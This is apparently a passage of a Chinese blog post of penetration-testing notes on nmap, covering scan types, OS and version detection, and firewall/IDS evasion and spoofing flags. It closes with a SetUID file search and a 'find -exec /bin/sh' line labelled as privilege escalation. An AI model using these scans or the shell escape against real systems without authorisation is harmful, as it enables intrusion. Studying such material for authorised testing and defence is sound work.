+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-iL &lt;输入文件名&gt; : 从主机/网络列表中输入</span><br><span class="line">-iR &lt;主机数量&gt;   : 选择随机目标</span><br><span class="line">--exclude &lt;host1[,host2][,host3],...&gt;    : 排除主机/网络</span><br><span class="line">--excludefile &lt;exclude_file&gt;             : 从文件中排除列表</span><br></pre></td></tr></table></figure>
+
+<h3 id="主机发现："><a href="#主机发现：" class="headerlink" title="主机发现："></a>主机发现：</h3><blockquote>
+<p>主机发现（HOST DISCOVERY）</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-sL    : 列表扫描 - 只需列出要扫描的目标</span><br><span class="line">-sn    : Ping 扫描 - 禁用端口扫描</span><br><span class="line">-Pn    : 将所有主机视为联机 -- 跳过主机发现</span><br><span class="line">-PS/PA/PU/PY[端口列表]    : 发现指定端口的 TCP SYN/ACK、UDP 或 SCTP</span><br><span class="line">-PE/PP/PM                : ICMP回声、时间戳和掩码请求发现探测</span><br><span class="line">-PO[协议列表]    : IP 协议 Ping IP 协议 Ping</span><br><span class="line">-n/-R    : 从不进行 DNS 解析/总是进行解析 [默认：有时］</span><br><span class="line">--dns-servers&lt;serv1[,serv2],...&gt;    : 指定自定义 DNS 服务器</span><br><span class="line">--system-dns    : 使用操作系统的 DNS 解析器</span><br><span class="line">--traceroute    : 跟踪到每个主机的跳转路径： 跟踪到每台主机的跳转路径</span><br></pre></td></tr></table></figure>
+
+<p>例如：使用nmap对192.168.56.0&#x2F;24网段内的主机进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.56.0/24</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这条命令没有指定具体的扫描模式，因此nmap将使用默认的扫描选项进行扫描，通常会执行常规的TCP三次握手扫描来确定目标主机上的开放端口。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这条命令使用Ping扫描（Ping Scan）模式，它会向目标主机发送ICMP Echo请求，以确定主机是否在线。这种扫描不会探测主机开放的端口，只是简单地确定主机是否存活。</p>
+<p>PING扫描需要ROOT权限，如果用户没有ROOT权限，PING扫描将会使用connect()调用.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.56.0/24</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这条命令与 -<code>sP</code> 命令作用相同，<code>-sn</code>参数是Ping扫描的简写。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sL 192.168.56.0/24：</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这条命令使用List Scan模式，它不会实际发送数据包到目标主机，而是列出目标网络上的所有IP地址，这有助于识别目标网络上的主机。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -PN 192.168.227.1/24    # PN No ping扫描；-O 启用操作系统检测</span><br></pre></td></tr></table></figure>
+
+<p>如果远程主机有<strong>防火墙</strong>，IDS和IPS系统，<strong>你可以使用-PN命令来确保不ping远程主机</strong>，因为有时候防火墙会组织掉ping请求。-PN命令告诉Nmap不用ping远程主机。使用-PN参数可以绕过PING命令，但是<strong>不影响主机的系统的发现</strong>。</p>
+<h3 id="扫描技术："><a href="#扫描技术：" class="headerlink" title="扫描技术："></a>扫描技术：</h3><blockquote>
+<p>扫描技术（SCAN TECHNIQUES）</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-sS/sT/sA/sW/sM    : TCP SYN/Connect()/ACK/Window/Maimon 扫描。Connect()全连接</span><br><span class="line">-sU                : UDP 扫描</span><br><span class="line">-sN/sF/sX          : TCP Null/FIN/Xmas 扫描。隐秘扫描，只适用于Linux系统。</span><br><span class="line">--scanflags &lt;flags&gt;              : 自定义 TCP 扫描标志</span><br><span class="line">-sI &lt;zombie host[:probeport]&gt;    : 空闲扫描</span><br><span class="line">-sY/sZ    :SCTP INIT/COOKIE-ECHO 扫描</span><br><span class="line">-sO       : IP 协议扫描</span><br><span class="line">-b &lt;FTP中继主机&gt;    : FTP 跳转扫描</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU 192.168.227.133    # sU UDP扫描</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这种扫描技术<strong>用来寻找目标主机打开的UDP端口</strong>。它不需要发送任何的SYN包，因为这种技术是针对UDP端口的。UDP扫描发送UDP数据包到目标主机，并等待响应，如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的。</p>
+</blockquote>
+<p>使用 <code>-sS</code> 参数进行SYN半链接扫描。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.31.180 -p 80 -sS</span><br></pre></td></tr></table></figure>
+
+<p>「半链接扫描」只进行两次握手，对方返回确认帧（ACK&#x3D;1）就判定端口开放，否则判定端口关闭。</p>
+<p>1）如果端口开放，就会进行两次握手，扫描结果中，STATE字段为 <strong>open</strong> 。</p>
+<p>2）如果端口关闭，就只有一次握手，扫描结果中，STATE字段为 <strong>closed</strong>。</p>
+<blockquote>
+<p>Tcp SYN Scan (sS) 这是一个基本的扫描方式,它被称为半开放扫描，因为这种技术使得Nmap不需要通过完整的握手，就能获得远程主机的信息。</p>
+<p>Nmap发送SYN包到远程主机，但是它不会产生任何会话。因此不会<strong>在目标主机上产生任何日志记录</strong>,因为没有形成会话。这个就是SYN扫描的优势。如果Nmap命令中没有指出扫描类型，默认的就是Tcp SYN.但是它需要root&#x2F;administrator权限。</p>
+</blockquote>
+<p>使用 <code>-sT</code> 参数进行TCP全连接扫描。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.31.180 -p 80 -sT</span><br></pre></td></tr></table></figure>
+
+<p>「全连接扫描」使用完整的三次握手建立链接，能够建立链接就判定端口开放，否则判定端口关闭。</p>
+<p>1）如果端口开放，就会进行完整的三次握手，成功建立链接，扫描结果中，STATE字段显示为 <strong>open</strong> 。</p>
+<p>2）如果端口关闭，就只能进行一次握手，无法建立链接，扫描结果中，STATE字段显示为 <strong>closed</strong>。</p>
+<blockquote>
+<p>不同于Tcp SYN扫描，Tcp connect()扫描需要完成三次握手，并且要求调用系统的connect()。Tcp connect()扫描技术<strong>只适用于找出TCP和UDP端口。</strong></p>
+</blockquote>
+<p>「隐秘扫描」向目标主机的端口发送TCP FIN包 或 Xmas tree包 或 Null包，如果收到RST响应包，就判定端口关闭，否则就判定端口开放或被屏蔽（open&#x2F;filtered）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap 127.0.0.1 -p 80 -sF    # Fin扫描</span><br><span class="line">nmap 127.0.0.1 -p 80 -sN    # Null扫描（所有flags都为0的TCP包）</span><br><span class="line">nmap 127.0.0.1 -p 80 -sX    # Xmas扫描（flags的FIN、URG、PUSH都为1的包）</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="端口规格和扫描顺序："><a href="#端口规格和扫描顺序：" class="headerlink" title="端口规格和扫描顺序："></a>端口规格和扫描顺序：</h3><blockquote>
+<p>端口规格和扫描顺序（PORT SPECIFICATION AND SCAN ORDER）</p>
+</blockquote>
+<p>默认情况下，nmap会扫描1000个最常见的端口。这些端口是根据常见的网络服务和协议进行选择的。</p>
+<p>Nmap 默认发送一个arp的ping数据包，来探测目标主机在1-10000范围内所开放的端口。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-p &lt;端口范围&gt;    : 只扫描指定的端口，可以一次扫描单个端口、多个端口、或扫描一个范围的端口</span><br><span class="line">                # 例如：-p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9</span><br><span class="line">--exclude-ports &lt;端口范围&gt;    : 不扫描指定端口</span><br><span class="line">-F    : 快速模式 - 比默认扫描少扫描端口</span><br><span class="line">-r    : 按顺序扫描端口 - 不随机化  -top-ports &lt;number&gt;：扫描 &lt;number&gt; 最常用的端口</span><br><span class="line">--port-ratio &lt;ratio&gt;    : 扫描比 &lt;ratio&gt; 更常见的端口</span><br></pre></td></tr></table></figure>
+
+<p>例如：不指定端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.31.180             # 扫描单个目标地址</span><br><span class="line">nmap 192.168.0.1 192.168.0.6    # 扫描多个目标地址</span><br><span class="line">nmap 192.168.0.1-6              # 扫描一个范围内的目标地址</span><br><span class="line">nmap 192.168.0.1/24             # 扫描目标地址所在的某个网段</span><br><span class="line">nmap 192.168.227.1/24 -exclude 192.168.227.1    # 扫描除过某一个ip外的所有子网主机</span><br><span class="line">nmap 10.130.1.1/24 -excludefile gov.txt         # 扫描除过某一个文件中的ip外的子网主机</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>例如：扫描「指定端口」，使用 <code>-p</code> 参数，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.31.180 -p 80</span><br><span class="line">nmap 192.168.31.180 -p 1-80</span><br><span class="line">nmap 192.168.31.180 -p 80,3389,22,21</span><br><span class="line">nmap 192.168.31.180 -p 1-65535</span><br><span class="line">nmap 192.168.31.180 -p-             # -p- 等价于 -p 1-65535</span><br></pre></td></tr></table></figure>
+
+<p>从返回结果中可以看出，其中有多少个端口关闭，结果中列出的几个端口就是开放的端口。</p>
+<h3 id="服务-版本检测："><a href="#服务-版本检测：" class="headerlink" title="服务&#x2F;版本检测："></a>服务&#x2F;版本检测：</h3><blockquote>
+<p>服务&#x2F;版本检测（SERVICE&#x2F;VERSION DETECTION）</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-sV    : 探测打开的端口，以确定服务/版本信息</span><br><span class="line">--version-intensity &lt;level&gt;    : 设置范围从 0（轻度）到 9（尝试所有探针）</span><br><span class="line">--version-light    : 仅限于最有可能的探测（强度 2）</span><br><span class="line">--version-all      : 尝试所有探针（强度 9）</span><br><span class="line">--version-trace    : 显示详细的版本扫描活动（用于调试）  </span><br></pre></td></tr></table></figure>
+
+<p>扫描端口时，默认显示端口对应的服务，但不显示服务版本。</p>
+<p>想要识别具体的「服务版本」，可以使用 <code>-sV</code> 参数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.31.180 -p 80 -sV</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>扫描结果中，VERSION字段显示服务的详细版本。</p>
+</blockquote>
+<blockquote>
+<p>版本检测是<strong>用来扫描目标主机和端口上运行的软件的版本。它不同于其它的扫描技术，它不是用来扫描目标主机上开放的端口，不过它需要从开放的端口获取信息来判断软件的版本。使用版本检测扫描之前需要先用TCPSYN扫描开放了哪些端口。</strong></p>
+<p><strong>这个扫描的话，速度会慢一些，67.86秒扫一个IP</strong>。</p>
+</blockquote>
+<h3 id="脚本扫描（SCRIPT-SCAN）："><a href="#脚本扫描（SCRIPT-SCAN）：" class="headerlink" title="脚本扫描（SCRIPT SCAN）："></a>脚本扫描（SCRIPT SCAN）：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-sC    : 等同于 --script=default</span><br><span class="line">--script=&lt;Lua scripts&gt;    : &lt;Lua scripts&gt; 是以逗号分隔的目录、脚本文件或脚本类别的逗号分隔列表</span><br><span class="line">--script-args=&lt;n1=v1,[n2=v2,...]&gt;    : 为脚本提供参数</span><br><span class="line">--script-args-file=filename          : 在文件中提供 NSE 脚本参数</span><br><span class="line">--script-trace       : 显示所有发送和接收的数据</span><br><span class="line">--script-updatedb    : 更新脚本数据库： 更新脚本数据库。</span><br><span class="line">--script-help=&lt;Lua scripts&gt;    : 显示有关脚本的帮助。&lt;Lua scripts&gt; 是以逗号分隔的脚本文件或脚本类别。</span><br></pre></td></tr></table></figure>
+
+<h3 id="操作系统检测（OS-DETECTION）："><a href="#操作系统检测（OS-DETECTION）：" class="headerlink" title="操作系统检测（OS DETECTION）："></a>操作系统检测（OS DETECTION）：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-O    : 启用操作系统检测。想要识别「操作系统版本」，可以使用 -O 参数。</span><br><span class="line">--osscan-limit    : 将操作系统检测限制在有希望的目标上</span><br><span class="line">--osscan-guess    : 更积极地猜测操作系统</span><br></pre></td></tr></table></figure>
+
+<p>提示：</p>
+<ol>
+<li>Nmap扫描出的系统版本并完全准确，仅供参考。</li>
+<li>当识别不出具体版本时，Nmap会以概率的形式列举出可能的操作系统。</li>
+</ol>
+<blockquote>
+<p>远程检测操作系统和软件，Nmap的OS检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的，通过获取的信息你可以知道已知的漏洞。Nmap有一个名为的nmap-OS-DB数据库，该数据库包含超过2600操作系统的信息。Nmap把TCP和UDP数据包发送到目标机器上，然后检查结果和数据库对照。</p>
+</blockquote>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.31.180 -p 80 -O</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="时间和性能（TIMING-AND-PERFORMANCE）："><a href="#时间和性能（TIMING-AND-PERFORMANCE）：" class="headerlink" title="时间和性能（TIMING AND PERFORMANCE）："></a>时间和性能（TIMING AND PERFORMANCE）：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Options which take &lt;time&gt; are in seconds, or append &#x27;ms&#x27; (milliseconds),</span><br><span class="line">&#x27;s&#x27; (seconds), &#x27;m&#x27; (minutes), or &#x27;h&#x27; (hours) to the value (e.g. 30m).</span><br><span class="line">-T&lt;0-5&gt;: Set timing template (higher is faster)</span><br><span class="line">--min-hostgroup/max-hostgroup &lt;size&gt;: Parallel host scan group sizes</span><br><span class="line">--min-parallelism/max-parallelism &lt;numprobes&gt;: Probe parallelization</span><br><span class="line">--min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;: Specifies</span><br><span class="line">  probe round trip time.</span><br><span class="line">--max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions.</span><br><span class="line">--host-timeout &lt;time&gt;: Give up on target after this long</span><br><span class="line">--scan-delay/--max-scan-delay &lt;time&gt;: Adjust delay between probes</span><br><span class="line">--min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second</span><br><span class="line">--max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per second</span><br></pre></td></tr></table></figure>
+
+<h3 id="防火墙-IDS-规避和欺骗（FIREWALL-IDS-EVASION-AND-SPOOFING）："><a href="#防火墙-IDS-规避和欺骗（FIREWALL-IDS-EVASION-AND-SPOOFING）：" class="headerlink" title="防火墙&#x2F;IDS 规避和欺骗（FIREWALL&#x2F;IDS EVASION AND SPOOFING）："></a>防火墙&#x2F;IDS 规避和欺骗（FIREWALL&#x2F;IDS EVASION AND SPOOFING）：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-f; --mtu &lt;val&gt;     : 分片数据包（可选择给定 MTU）</span><br><span class="line">-D &lt;decoy1,decoy2[,ME],...&gt;    : 用诱饵隐藏扫描</span><br><span class="line">-S &lt;IP_Address&gt;     : 欺骗源地址</span><br><span class="line">-e &lt;iface&gt;     : 使用指定接口</span><br><span class="line">-g/--source-port &lt;portnum&gt;     : 使用指定的端口号</span><br><span class="line">--proxies &lt;url1,[url2],...&gt;    : 通过 HTTP/SOCKS4 代理中继连接</span><br><span class="line">--data &lt;hex string&gt;       : 在发送的数据包中附加自定义有效载荷</span><br><span class="line">--data-string &lt;string&gt;    : 向发送的数据包附加自定义 ASCII 字符串</span><br><span class="line">--data-length &lt;num&gt;       : 向发送的数据包附加随机数据</span><br><span class="line">--ip-options &lt;options&gt;    : 使用指定的 IP 选项发送数据包</span><br><span class="line">--ttl &lt;val&gt;    : 设置 IP 生存时间字段</span><br><span class="line">--spoof-mac &lt;mac address/prefix/vendor name&gt;: ：欺骗你的 MAC 地址</span><br><span class="line">--badsum    : 发送带有假 TCP/UDP/SCTP 校验和的数据包</span><br></pre></td></tr></table></figure>
+
+<h3 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h3><blockquote>
+<p>输出（OUTPUT）</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-oN/-oX/-oS/-oG &lt;file&gt;    : 以普通、XML、s|&lt;rIpt kIddi3、 和 Grepable 格式的扫描结果分别输出到给定的文件名中。</span><br><span class="line">-oA &lt;basename&gt;    : 同时以三种主要格式输出</span><br><span class="line">-v    : 增加冗长程度（使用 -vv 或更多，效果更佳）</span><br><span class="line">-d    : 增加调试级别（使用-dd 或更高级别效果更佳）</span><br><span class="line">--reason    : 显示端口处于特定状态的原因</span><br><span class="line">--open      : 只显示已打开（或可能已打开）的端口</span><br><span class="line">--packet-trace    : 数据包跟踪： 显示所有发送和接收的数据包</span><br><span class="line">--iflist    : 打印主机接口和路由（用于调试）</span><br><span class="line">--append-output   : 附加到指定的输出文件，而不是掐断输出文件</span><br><span class="line">--resume &lt;filename&gt;   : 恢复已中止的扫描</span><br><span class="line">--noninteractive      : 非交互 禁用通过键盘进行的运行时交互</span><br><span class="line">--stylesheet &lt;path/URL&gt;   : XSL 样式表，将 XML 输出转换为 HTML</span><br><span class="line">--webxml   : 参考Nmap.Org的样式表以获得更可移植的XML</span><br><span class="line">--no-stylesheet   : 无样式表： 防止将 XSL 样式表与 XML 输出相关联</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<p>Nmap的扫描结果可以保存到文件中，比如文本格式、XML格式。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1）将扫描结果导出为「文本格式」，结果原样保存。</span><br><span class="line"></span><br><span class="line">nmap 192.168.31.180 -p 80 -oN result.txt</span><br><span class="line"></span><br><span class="line">2）将扫描结果导出为「xml格式」，结果的保存格式会发生变化。</span><br><span class="line"></span><br><span class="line">nmap 192.168.31.180 -p 80 -oX result.xml</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -vv 14.215.177.39</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>简单扫描，并对返回的结果详细描述输出,这个扫描是可以看到扫描的过程的,漫长的扫描的过程中可以看到百分比， 就不会显得那么枯燥，而且可以提升逼格。</p>
+<p>-v和-vv扫描几乎是一样都，都是列出了详细的扫描过程</p>
+</blockquote>
+<h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-6    : 启用 IPv6 扫描</span><br><span class="line">-A    : 启用 系统检测、版本检测、脚本扫描和跟踪路由 操作</span><br><span class="line">-datadir &lt;dirname&gt;     : 指定自定义 Nmap 数据文件位置</span><br><span class="line">--send-eth/-send-ip    : 使用原始以太网帧或 IP 数据包发送</span><br><span class="line">--privileged      : 假定用户具有完全权限</span><br><span class="line">--unprivileged    : 假设用户没有原始套接字权限</span><br><span class="line">-V    : 打印版本号</span><br><span class="line">-h    : 打印此帮助摘要页。</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 10.130.1.43</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>A OS识别，版本探测，脚本扫描和traceroute综合扫描</p>
+<p>此选项设置包含了1-10000的端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测</p>
+</blockquote>
+<p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -A scanme.nmap.org</span><br><span class="line">nmap -v -sn 192.168.0.0/16 10.0.0.0/8</span><br><span class="line">nmap -v -iR 10000 -Pn -p 80</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2 &gt; /dev/null</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>-perm -4000</code> ：这个选项指定了要搜索的文件的权限。-4000 表示查找具有SetUID权限的文件。SetUID权限允许普通用户在执行该文件时以文件所有者的权限来执行，通常用于提升普通用户对特定程序的执行权限。</p>
+<p><code>-print</code> ：这个选项表示找到匹配条件的文件后打印出它们的路径。</p>
+<p><code>2 &gt; /dev/null</code> ：这部分是将标准错误输出重定向到 &#x2F;dev&#x2F;null，这样可以忽略任何错误信息，只输出符合条件的文件路径。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name cron.php -exec &quot;/bin/sh&quot; \; </span><br><span class="line">//提权，重要</span><br></pre></td></tr></table></figure>
+
+
+
+<p>检测文件是否带有病毒，但是不一定准确</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.virustotal.com/</span><br></pre></td></tr></table></figure>
+
+
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/kali/" rel="tag"># kali</a>
+              <a href="/tags/msf/" rel="tag"># msf</a>
+              <a href="/tags/dirsearch/" rel="tag"># dirsearch</a>
+              <a href="/tags/nmap/" rel="tag"># nmap</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/12/28/%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7/" rel="prev" title="抓包工具">
+                  <i class="fa fa-angle-left"></i> 抓包工具
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/12/29/%E9%9D%B6%E6%9C%BA/" rel="next" title="靶机">
+                  靶机 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">John Doe</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
